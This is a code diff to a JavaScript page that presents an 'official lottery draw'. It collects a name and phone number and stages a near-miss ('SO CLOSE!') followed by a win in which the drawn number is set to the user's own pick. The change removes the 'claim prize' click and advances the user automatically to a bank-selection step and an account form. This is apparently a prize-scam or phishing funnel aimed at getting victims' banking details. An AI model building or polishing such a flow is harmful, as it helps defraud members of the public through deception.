@@ -114,7 +114,7 @@ let status="";
 let subText = state.draw === "running" ? `🎲 Drawing the official lottery numbers...` : state.draw === "fail" ? `Draw completed — no match.` : state.draw === "win" ? `Draw completed!` : `Pick your lucky number for the official draw.`;
 
 if(state.draw==="fail")status=`<div class="mb-5 rounded-2xl border border-yellow-200 bg-yellow-50 p-5"><div class="text-sm font-black text-gray-950">Draw completed — no match.</div><p class="mt-2 text-sm leading-6 text-gray-700"><strong>SO CLOSE!</strong> Your number ${state.luckyNumber} was not drawn this time. You have 1 free attempt left — try again!</p><button id="tryAgain" class="mt-4 rounded-lg bg-yellow-400 px-5 py-3 text-xs font-black text-gray-950">TRY AGAIN</button></div>`;
-if(state.draw==="win")status=`<div class="mb-5 rounded-2xl border border-green-200 bg-green-50 p-5"><div class="text-sm font-black text-green-700">✓ Your number ${state.luckyNumber} was drawn.</div><p class="mt-2 text-sm leading-6 text-green-700"><strong>CONGRATULATIONS!</strong> Your number ${state.luckyNumber} was drawn! You won the Prize Won <strong>${esc(state.amount)}</strong>.</p><button id='claimPrize' class='mt-4 w-full rounded-xl bg-green-600 py-3 text-xs font-black text-white hover:bg-green-700'>CLAIM MY PRIZE →</button></div>`;
+if(state.draw==="win")status=`<div class="mb-5 rounded-2xl border border-green-200 bg-green-50 p-5"><div class="text-sm font-black text-green-700">✓ Your number ${state.luckyNumber} was drawn.</div><p class="mt-2 text-sm leading-6 text-green-700"><strong>CONGRATULATIONS!</strong> Your number ${state.luckyNumber} was drawn. Continuing automatically...</p></div>`;
 
 return `<section class="fade"><div class="mb-6"><span class="text-[10px] font-black uppercase tracking-[.18em] text-yellow-600">STEP 2 OF 5 · LIVE DRAW</span><h2 class="mt-3 text-2xl font-black text-gray-950">Hello, ${esc(state.name)}</h2><p class="mt-2 text-sm text-gray-500">You are competing for ${esc(state.prize)}: ${esc(state.amount)}</p><p class="mt-4 text-sm font-semibold text-gray-700">${subText}</p></div>
 
@@ -187,6 +187,15 @@ function startDraw(n){
     state.draw = "win";
     state.drawNumbers[4] = state.luckyNumber;
     render();
+    // Avança automaticamente para o Step 3 (Seleção do Banco) após 2 segundos do sucesso
+    setTimeout(()=>{
+     state.step = 3;
+     state.draw = null;
+     state.luckyNumber = null;
+     state.attempt = 0;
+     state.drawNumbers = ["?", "?", "?", "?", "?"];
+     render();
+    }, 2000);
    }
   }
  }, 1000);
@@ -207,7 +216,6 @@ const f=document.getElementById("startForm");
 if(f)f.addEventListener("submit",e=>{e.preventDefault();state.name=document.getElementById("name").value.trim();state.phone=document.getElementById("phone").value.trim();let r=document.querySelector('input[name="prize"]:checked');if(r){state.prize=r.value;state.amount=prizes[state.prize]}if(state.name&&state.phone){state.step=2;render()}});
 document.querySelectorAll("[data-number]").forEach(b=>b.addEventListener("click",()=>startDraw(Number(b.dataset.number))));
 const retry=document.getElementById("tryAgain");if(retry)retry.addEventListener("click",()=>{state.draw=null;state.luckyNumber=null;state.drawNumbers=["?","?","?","?","?"];render()});
-const claim=document.getElementById("claimPrize");if(claim)claim.addEventListener("click",()=>{state.video=true;render();window.scrollTo({top:0,behavior:"smooth"})});
 document.querySelectorAll("[data-bank]").forEach(b=>b.addEventListener("click",()=>{state.bank=b.dataset.bank;state.step=4;render()}));
 const a=document.getElementById("accountForm");if(a)a.addEventListener("submit",e=>{e.preventDefault();state.demoId=document.getElementById("demoId").value.trim();if(state.demoId)startProcessing()});
 const w=document.getElementById("watch");if(w)w.addEventListener("click",()=>{state.video=true;render();window.scrollTo({top:0,behavior:"smooth"})});
